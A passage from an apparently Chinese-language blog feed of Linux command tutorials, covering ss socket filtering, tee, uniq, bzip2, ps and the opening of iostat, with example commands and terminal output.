摘要&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -s &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# ss -sTotal: 34 (kernel 48)TCP: 4 (estab 1, closed 0, orphaned 0, synrecv 0, timewait 0/0), ports 3Transport Total IP IPv6* 48 - - RAW 0 0 0 UDP 5 5 0 TCP 4 4 0 INET 9 9 0 FRAG 0 0 0 [root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出当前的established, closed, orphaned and waiting TCP sockets 实例3：列出所有打开的网络连接端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# ss -lRecv-Q Send-Q Local Address:Port Peer Address:Port 0 0 127.0.0.1:smux *:* 0 0 *:3690 *:* 0 0 *:ssh *:* [root@localhost ~]# 实例4：查看进程使用的socket&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -pl &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# ss -plRecv-Q Send-Q Local Address:Port Peer Address:Port 0 0 127.0.0.1:smux *:* users:(("snmpd",2716,8))0 0 *:3690 *:* users:(("svnserve",3590,3))0 0 *:ssh *:* users:(("sshd",2735,3))[root@localhost ~]# 实例5：找出打开套接字/端口应用程序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -lp | grep 3306 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# ss -lp|grep 19350 0 *:1935 *:* users:(("fmsedge",2913,18))0 0 127.0.0.1:19350 *:* users:(("fmsedge",2913,17))[root@localhost ~]# ss -lp|grep 33060 0 *:3306 *:* users:(("mysqld",2871,10))[root@localhost ~]# 实例6：显示所有UDP Sockets&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -u -a &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# ss -u -aState Recv-Q Send-Q Local Address:Port Peer Address:Port UNCONN 0 0 127.0.0.1:syslog *:* UNCONN 0 0 *:snmp *:* ESTAB 0 0 192.168.120.203:39641 10.58.119.119:domain [root@localhost ~]# 实例7：显示所有状态为established的SMTP连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -o state established '( dport = :smtp or sport = :smtp )' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost ~]# ss -o state established '( dport = :smtp or sport = :smtp )' Recv-Q Send-Q Local Address:Port Peer Address:Port [root@localhost ~]# 实例8：显示所有状态为Established的HTTP连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -o state established '( dport = :http or sport = :http )' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# ss -o state established '( dport = :http or sport = :http )' Recv-Q Send-Q Local Address:Port Peer Address:Port 0 0 75.126.153.214:2164 192.168.10.42:http [root@localhost ~]# 实例9：列举出处于 FIN-WAIT-1状态的源端口为 80或者 443，目标网络为 193.233.7/24所有 tcp套接字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -o state fin-wait-1 '( sport = :http or sport = :https )' dst 193.233.7/24 实例10：用TCP 状态过滤Sockets:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ss -4 state FILTER-NAME-HERE ss -6 state FILTER-NAME-HERE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost ~]#ss -4 state closing Recv-Q Send-Q Local Address:Port Peer Address:Port 1 11094 75.126.153.214:http 192.168.10.42:4669 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FILTER-NAME-HERE 可以代表以下任何一个： established syn-sent syn-recv fin-wait-1 fin-wait-2 time-wait closed close-wait last-ack listen closing &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;all : 所有以上状态 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;connected : 除了listen and closed的所有状态 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;synchronized :所有已连接的状态除了syn-sent &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;bucket : 显示状态为maintained as minisockets,如：time-wait和syn-recv. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;big : 和bucket相反. 实例11：匹配远程地址和端口号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12345ss dst ADDRESS_PATTERNss dst 192.168.1.5ss dst 192.168.119.113:http ss dst 192.168.119.113:smtp ss dst 192.168.119.113:443 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost ~]# ss dst 192.168.119.113State Recv-Q Send-Q Local Address:Port Peer Address:Port ESTAB 0 0 192.168.119.103:16014 192.168.119.113:20229 ESTAB 0 0 192.168.119.103:16014 192.168.119.113:61056 ESTAB 0 0 192.168.119.103:16014 192.168.119.113:61623 ESTAB 0 0 192.168.119.103:16014 192.168.119.113:60924 ESTAB 0 0 192.168.119.103:16050 192.168.119.113:43701 ESTAB 0 0 192.168.119.103:16073 192.168.119.113:32930 ESTAB 0 0 192.168.119.103:16073 192.168.119.113:49318 ESTAB 0 0 192.168.119.103:16014 192.168.119.113:3844 [root@localhost ~]# ss dst 192.168.119.113:httpState Recv-Q Send-Q Local Address:Port Peer Address:Port [root@localhost ~]# ss dst 192.168.119.113:3844State Recv-Q Send-Q Local Address:Port Peer Address:Port ESTAB 0 0 192.168.119.103:16014 192.168.119.113:3844 [root@localhost ~]# 实例12：匹配本地地址和端口号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123456ss src ADDRESS_PATTERNss src 192.168.119.103ss src 192.168.119.103:httpss src 192.168.119.103:80ss src 192.168.119.103:smtpss src 192.168.119.103:25 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost ~]# ss src 192.168.119.103:16021State Recv-Q Send-Q Local Address:Port Peer Address:Port ESTAB 0 0 192.168.119.103:16021 192.168.119.201:63054 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:62894 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:63055 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:2274 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:44784 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:7233 ESTAB 0 0 192.168.119.103:16021 192.168.119.103:58660 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:44822 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:56737 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:57487 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:56736 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:64652 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:56586 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:64653 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:56587 [root@localhost ~]# 实例13：将本地或者远程端口和一个数比较&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ss dport OP PORT ss sport OP PORT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# ss sport = :http [root@localhost ~]# ss dport = :http [root@localhost ~]# ss dport \&gt; :1024 [root@localhost ~]# ss sport \&gt; :1024 [root@localhost ~]# ss sport \&lt; :32000 [root@localhost ~]# ss sport eq :22 [root@localhost ~]# ss dport != :22 [root@localhost ~]# ss state connected sport = :http [root@localhost ~]# ss \( sport = :http or sport = :https \) [root@localhost ~]# ss -o state fin-wait-1 \( sport = :http or sport = :https \) dst 192.168.1/24 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ss dport OP PORT 远程端口和一个数比较；ss sport OP PORT 本地端口和一个数比较。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;OP 可以代表以下任意一个: &lt;= or le : 小于或等于端口号 = or ge : 大于或等于端口号 == or eq : 等于端口号 != or ne : 不等于端口号 &lt; or lt : 小于端口号 or gt : 大于端口号 实例14：ss 和 netstat 效率对比&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12time netstat -attime ss &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# time ss real 0m0.739suser 0m0.019ssys 0m0.013s[root@localhost ~]# [root@localhost ~]# time netstat -atreal 2m45.907suser 0m0.063ssys 0m0.067s[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用time 命令分别获取通过netstat和ss命令获取程序和概要占用资源所使用的时间。在服务器连接数比较多的时候，netstat的效率完全没法和ss比。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tee]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F67.%20Linux%20%E5%91%BD%E4%BB%A4-%20tee%2F</url>
    <content type="text"><![CDATA[Linux 命令- tee&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tee 命令用于读取标准输入的数据，并将其内容输出成文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tee 指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。 1. 命令语法1tee [参数] [文件] 2. 命令参数 -a或–append 附加到既有文件的后面，而非覆盖它． -i或–ignore-interrupts 忽略中断信号。 –help 在线帮助。 –version 显示版本信息。 使用实例实例1：使用指令 tee 将用户输入的数据同时保存到文件 file1 和 file2 中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tee file1 file2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# tee file1 file2my linuxmy linux^C[root@localhost ~]# cat file1 my linux[root@localhost ~]# cat file2 my linux &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以使用管道符执行 123456[root@localhost ~]# echo 'my linux'|tee file1 file2my linux[root@localhost ~]# cat file1my linux[root@localhost ~]# cat file2my linux]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- uniq]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F66.%20Linux%20%E5%91%BD%E4%BB%A4-%20uniq%2F</url>
    <content type="text"><![CDATA[Linux 命令- uniq&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux uniq 命令用于检查及删除文本文件中重复的行列。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;uniq 可检查文本文件中重复出现的行列。 1. 命令语法1uniq [参数] [file] 2. 命令参数 -c或–count 在每列旁边显示该行重复出现的次数。 -d或–repeated 仅显示重复出现的行列。 -f&lt;栏位&gt;或–skip-fields=&lt;栏位&gt; 忽略比较指定的栏位。 -s&lt;字符位置&gt;或–skip-chars=&lt;字符位置&gt; 忽略比较指定的字符。 -u或–unique 仅显示出一次的行列。 -w&lt;字符位置&gt;或–check-chars=&lt;字符位置&gt; 指定要比较的字符。 –help 显示帮助。 –version 显示版本信息。 [输入文件] 指定已排序好的文本文件。 [输出文件] 指定输出的文件。 3. 使用实例实例1：文件 testfile 中第2、5、9行为相同的行，使用 uniq 命令删除重复的行。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1uniq testfile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314$ cat testfile #原有内容 test 30 test 30 test 30 Hello 95 Hello 95 Hello 95 Hello 95 Linux 85 Linux 85 $ uniq testfile #删除重复行后的内容 test 30 Hello 95 Linux 85 实例2：检查文件并删除文件中重复出现的行，并在行首显示该行重复出现的次数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1uniq -c testfile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234$ uniq-ctestfile #删除重复行后的内容 3 test 30 #前面的数字的意义为该行共出现了3次 4 Hello 95 #前面的数字的意义为该行共出现了4次 2 Linux 85 #前面的数字的意义为该行共出现了2次]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- bz2]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F33.%20Linux%20%E5%91%BD%E4%BB%A4-bz2%2F</url>
    <content type="text"><![CDATA[Linux 命令- bz2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;bzip2 命令与 gzip 类似。bzip2 同样也不能压缩目录。 1.命令格式1bzip2 [参数] [文件] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;bzip2采用新的压缩演算法，压缩效果比传统的LZ77/LZ78压缩演算法来得好。若没有加上任何参数，bzip2压缩完文件后会产生.bz2的压缩文件，并删除原始的文件。 3.命令参数 -c或–stdout 将压缩与解压缩的结果送到标准输出。 -d或–decompress 执行解压缩。 -f或–force bzip2在压缩或解压缩时，若输出文件与现有文件同名，预设不会覆盖现有文件。若要覆盖，请使用此参数。 -h或–help 显示帮助。 -k或–keep bzip2在压缩或解压缩后，会删除原始的文件。若要保留原始文件，请使用此参数。 -s或–small 降低程序执行时内存的使用量。 -t或–test 测试.bz2压缩文件的完整性。 -v或–verbose 压缩或解压缩文件时，显示详细的信息。 -z或–compress 强制执行压缩。 -L,–license, -V或–version 显示版本信息。 –repetitive-best 若文件中有重复出现的资料时，可利用此参数提高压缩效果。 –repetitive-fast 若文件中有重复出现的资料时，可利用此参数加快执行速度。 -压缩等级 压缩时的区块大小。 4.使用实例实例1：使用 bzip2 压缩一个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1bzip test.txt.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# cd test[root@localhost test]# bzip2 test.txt[root@localhost test]# lstest.txt.bz2[root@localhost test]# bzip2 -d test.txt.bz2[root@localhost test]# bzip2 -z test.txt[root@localhost test]# lstest.txt.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩时，可以加 -z 参数，也可以不家加，都可以压缩文件，-d 则为解压的选项。 实例2：bzip2 解压一个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123456[root@localhost test]# bzip2 -d test.txt.bz2[root@localhost test]# bzip2 test.tar[root@localhost test]# bzip2 -vd test.tar.bz2test.tar.bz2: done[root@localhost test]# lstest test.tar test.txt 实例3：通过 bzcat 命令可以直接读压缩文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1bzcat test.txt.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# lstest test.tar.bz2 test.txt.bz2[root@localhost test]# bzcat test.txt.bz2testtest2test12]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ps]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F43.%20Linux%20%E5%91%BD%E4%BB%A4-%20ps%2F</url>
    <content type="text"><![CDATA[Linux 命令- ps&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux中的ps命令是Process Status的缩写。ps命令用来列出系统中当前运行的那些进程。ps命令列出的是当前那些进程的快照，就是执行ps命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用top命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要对进程进行监测和控制，首先必须要了解当前进程的情况，也就是需要查看当前进程，而 ps 命令就是最基本同时也是非常强大的进程查看命令。使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等。总之大部分信息都是可以通过执行该命令得到的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ps 为我们提供了进程的一次性的查看，它所提供的查看结果并不动态连续的；如果想对进程时间监控，应该用 top 工具。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;kill 命令用于杀死进程。 inux上进程有5种状态: 运行(正在运行或在运行队列中等待) 中断(休眠中, 受阻, 在等待某个条件的形成或接受到信号) 不可中断(收到信号不唤醒和不可运行, 进程必须等待直到有中断发生) 僵死(进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放) 停止(进程收到SIGSTOP, SIGSTP, SIGTIN, SIGTOU信号后停止运行运行) ps工具标识进程的5种状态码: D 不可中断 uninterruptible sleep (usually IO) R 运行 runnable (on run queue) S 中断 sleeping T 停止 traced or stopped Z 僵死 a defunct (”zombie”) process 1．命令格式1ps[参数] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来显示当前进程的状态 3．命令参数 a 显示所有进程 -a 显示同一终端下的所有程序 -A 显示所有进程 c 显示进程的真实名称 -N 反向选择 -e 等于“-A” e 显示环境变量 f 显示程序间的关系 -H 显示树状结构 r 显示当前终端的进程 T 显示当前终端的所有程序 u 指定用户的所有进程 -au 显示较详细的资讯 -aux 显示所有包含其他使用者的行程 -C&lt;命令&gt; 列出指定命令的状况 –lines&lt;行数&gt; 每页显示的行数 –width&lt;字符数&gt; 每页显示的字符数 –help 显示帮助信息 –version 显示版本显示 4．使用实例实例1：显示所有进程信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -A &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost test6]# ps -A PID TTY TIME CMD 1 ? 00:00:00 init 2 ? 00:00:01 migration/0 3 ? 00:00:00 ksoftirqd/0 4 ? 00:00:01 migration/1 5 ? 00:00:00 ksoftirqd/1 6 ? 00:29:57 events/0 7 ? 00:00:00 events/1 8 ? 00:00:00 khelper 49 ? 00:00:00 kthread 54 ? 00:00:00 kblockd/0 55 ? 00:00:00 kblockd/1 56 ? 00:00:00 kacpid 217 ? 00:00:00 cqueue/0 ……省略部分结果 实例2：显示指定用户信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -u root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost test6]# ps -u root PID TTY TIME CMD 1 ? 00:00:00 init 2 ? 00:00:01 migration/0 3 ? 00:00:00 ksoftirqd/0 4 ? 00:00:01 migration/1 5 ? 00:00:00 ksoftirqd/1 6 ? 00:29:57 events/0 7 ? 00:00:00 events/1 8 ? 00:00:00 khelper 49 ? 00:00:00 kthread 54 ? 00:00:00 kblockd/0 55 ? 00:00:00 kblockd/1 56 ? 00:00:00 kacpid ……省略部分结果 实例3：显示所有进程信息，连同命令行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -ef &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost test6]# ps -efUID PID PPID C STIME TTY TIME CMDroot 1 0 0 Nov02 ? 00:00:00 init [3] root 2 1 0 Nov02 ? 00:00:01 [migration/0]root 3 1 0 Nov02 ? 00:00:00 [ksoftirqd/0]root 4 1 0 Nov02 ? 00:00:01 [migration/1]root 5 1 0 Nov02 ? 00:00:00 [ksoftirqd/1]root 6 1 0 Nov02 ? 00:29:57 [events/0]root 7 1 0 Nov02 ? 00:00:00 [events/1]root 8 1 0 Nov02 ? 00:00:00 [khelper]root 49 1 0 Nov02 ? 00:00:00 [kthread]root 54 49 0 Nov02 ? 00:00:00 [kblockd/0]root 55 49 0 Nov02 ? 00:00:00 [kblockd/1]root 56 49 0 Nov02 ? 00:00:00 [kacpid]……省略部分结果 实例4： ps 与grep 常用组合用法，查找特定进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -ef|grep ssh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test6]# ps -ef|grep sshroot 2720 1 0 Nov02 ? 00:00:00 /usr/sbin/sshdroot 17394 2720 0 14:58 ? 00:00:00 sshd: root@pts/0 root 17465 17398 0 15:57 pts/0 00:00:00 grep ssh 实例5：将目前属于您自己这次登入的 PID 与相关信息列示出来&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test6]# ps -lF S UID PID PPID C PRI NI ADDR SZ WCHAN TTY TIME CMD4 S 0 17398 17394 0 75 0 - 16543 wait pts/0 00:00:00 bash4 R 0 17469 17398 0 77 0 - 15877 - pts/0 00:00:00 ps &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;各相关信息的意义： F 代表这个程序的旗标 (flag)， 4 代表使用者为 super user S 代表这个程序的状态 (STAT)，关于各 STAT 的意义将在内文介绍 UID 程序被该 UID 所拥有 PID 就是这个程序的 ID ！ PPID 则是其上级父程序的ID C CPU 使用的资源百分比 PRI 这个是 Priority (优先执行序) 的缩写 NI 这个是 Nice 值，在下一小节我们会持续介绍 ADDR 这个是 kernel function，指出该程序在内存的那个部分。如果是个 running的程序，一般就是 “-“ SZ 使用掉的内存大小 WCHAN 目前这个程序是否正在运作当中，若为 - 表示正在运作 TTY 登入者的终端机位置 TIME 使用掉的 CPU 时间。 CMD 所下达的指令为何 在预设的情况下， ps 仅会列出与目前所在的 bash shell 有关的 PID 而已，所以， 当我使用 ps -l 的时候，只有三个 PID。 实例6：列出目前所有的正在内存当中的程序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps aux &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost test6]# ps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 10368 676 ? Ss Nov02 0:00 init [3] root 2 0.0 0.0 0 0 ? S&lt; Nov02 0:01 [migration/0]root 3 0.0 0.0 0 0 ? SN Nov02 0:00 [ksoftirqd/0]root 4 0.0 0.0 0 0 ? S&lt; Nov02 0:01 [migration/1]root 5 0.0 0.0 0 0 ? SN Nov02 0:00 [ksoftirqd/1]root 6 0.0 0.0 0 0 ? S&lt; Nov02 29:57 [events/0]root 7 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [events/1]root 8 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [khelper]root 49 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [kthread]root 54 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [kblockd/0]root 55 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [kblockd/1]root 56 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [kacpid]……省略部分结果 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 USER：该 process 属于那个使用者账号的 PID ：该 process 的号码 %CPU：该 process 使用掉的 CPU 资源百分比 %MEM：该 process 所占用的物理内存百分比 VSZ ：该 process 使用掉的虚拟内存量 (Kbytes) RSS ：该 process 占用的固定的内存量 (Kbytes) TTY ：该 process 是在那个终端机上面运作，若与终端机无关，则显示 ?，另外， tty1-tty6 是本机上面的登入者程序，若为 pts/0 等等的，则表示为由网络连接进主机的程序。 STAT：该程序目前的状态，主要的状态有 R ：该程序目前正在运作，或者是可被运作 S ：该程序目前正在睡眠当中 (可说是 idle 状态)，但可被某些讯号 (signal) 唤醒。 T ：该程序目前正在侦测或者是停止了 Z ：该程序应该已经终止，但是其父程序却无法正常的终止他，造成 zombie (疆尸) 程序的状态 START：该 process 被触发启动的时间 TIME ：该 process 实际使用 CPU 运作的时间 COMMAND：该程序的实际指令 实例7：列出类似程序树的程序显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -axjf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;*输出 123456789101112131415[root@localhost test6]# ps -axjfWarning: bad syntax, perhaps a bogus '-'? See /usr/share/doc/procps-3.2.7/FAQ PPID PID PGID SID TTY TPGID STAT UID TIME COMMAND 0 1 1 1 ? -1 Ss 0 0:00 init [3] 1 2 1 1 ? -1 S&lt; 0 0:01 [migration/0] 1 3 1 1 ? -1 SN 0 0:00 [ksoftirqd/0] 1 4 1 1 ? -1 S&lt; 0 0:01 [migration/1] 1 5 1 1 ? -1 SN 0 0:00 [ksoftirqd/1] 1 6 1 1 ? -1 S&lt; 0 29:58 [events/0] 1 7 1 1 ? -1 S&lt; 0 0:00 [events/1] 1 8 1 1 ? -1 S&lt; 0 0:00 [khelper] 1 49 1 1 ? -1 S&lt; 0 0:00 [kthread] 49 54 1 1 ? -1 S&lt; 0 0:00 \_ [kblockd/0] 49 55 1 1 ? -1 S&lt; 0 0:00 \_ [kblockd/1] 49 56 1 1 ? -1 S&lt; 0 0:00 \_ [kacpid] 实例8：找出与 cron 与 syslog 这两个服务有关的 PID 号码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1pa aux|egrep '(cron|syslog)' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test6]# ps aux | egrep '(cron|syslog)'root 2682 0.0 0.0 83384 2000 ? Sl Nov02 0:00 /sbin/rsyslogd -i /var/run/syslogd.pid -c 5root 2735 0.0 0.0 74812 1140 ? Ss Nov02 0:00 crondroot 17475 0.0 0.0 61180 832 pts/0 S+ 16:27 0:00 egrep (cron|syslog)[root@localhost test6]# 其他实例：1. 可以用 | 管道和 more 连接起来分页查看&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -aux |more 2. 把所有进程显示出来，并输出到ps001.txt文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -aux &gt; ps001.txt 3. 输出指定的字段&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -o pid,ppid,pgrp,session,tpgid,comm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test6]# ps -o pid,ppid,pgrp,session,tpgid,comm PID PPID PGRP SESS TPGID COMMAND17398 17394 17398 17398 17478 bash17478 17398 17478 17398 17478 ps[root@localhost test6]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- iostat]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F49.%20Linux%20%E5%91%BD%E4%BB%A4-%20iostat%2F</url>
    <content type="text"><![CDATA[Linux 命令- iostat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中的 iostat是I/O statistics（输入/输出统计）的缩写，iostat工具将对系统的磁盘操作活动进行监视。它的特点是汇报磁盘活动统计情况，同时也会汇报出CPU使用情况。同vmstat一样，iostat也有一个弱点，就是它不能对某个进程进行深入分析，仅对系统的整体情况进行分析。iostat属于sysstat软件包。可以用yum install sysstat 直接安装。 1．命令格式1iostat [参数] [时间] [次数] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过iostat方便查看CPU、网卡、tty设备、磁盘、CD-ROM 等等设备的活动情况, 负载信息。 3．命令参数 -c 显示CPU使用情况 -d 显示磁盘使用情况 -k 以 KB 为单位显示 -m 以 M 为单位显示 -N 显示磁盘阵列(LVM) 信息 -n 显示NFS 使用情况 -p[磁盘] 显示磁盘和分区的情况 -t 显示终端和CPU的信息 -x 显示详细信息 -V 显示版本信息 4．使用实例实例1：显示所有设备负载情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@CT1186 ~]# iostatLinux 2.6.18-128.el5 (CT1186) 2012年12月28日avg-cpu: %user %nice %system %iowait %steal %idle 8.30 0.02 5.07 0.17 0.00 86.44Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda 22.73 43.70 487.42 674035705 7517941952sda1 0.00 0.00 0.00 2658 536sda2 0.11 3.74 3.51 57721595 54202216sda3 0.98 0.61 17.51 9454172 270023368sda4 0.00 0.00 0.00 6 0sda5 6.95 0.12 108.73 1924834 1677123536sda6 2.20 0.18 31.22 2837260 481488056sda7 12.48 39.04 326.45 602094508 5035104240 说明：cpu属性值说明： %user：CPU处在用户模式下的时间百分比。 %nice：CPU处在带NICE值的用户模式下的时间百分比。 %system：CPU处在系统模式下的时间百分比。 %iowait：CPU等待输入输出完成时间的百分比。 %steal：管理程序维护另一个虚拟处理器时，虚拟CPU的无意识等待时间百分比。 %idle：CPU空闲时间百分比。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：如果%iowait的值过高，表示硬盘存在I/O瓶颈，%idle值高，表示CPU较空闲，如果%idle值高但系统响应慢时，有可能是CPU等待分配内存，此时应加大内存容量。%idle值如果持续低于10，那么系统的CPU处理能力相对较低，表明系统中最需要解决的资源是CPU。 disk属性值说明： rrqm/s: 每秒进行 merge 的读操作数目。即 rmerge/s wrqm/s: 每秒进行 merge 的写操作数目。即 wmerge/s r/s: 每秒完成的读 I/O 设备次数。即 rio/s w/s: 每秒完成的写 I/O 设备次数。即 wio/s rsec/s: 每秒读扇区数。即 rsect/s wsec/s: 每秒写扇区数。即 wsect/s rkB/s: 每秒读K字节数。是 rsect/s 的一半，因为每扇区大小为512字节。 wkB/s: 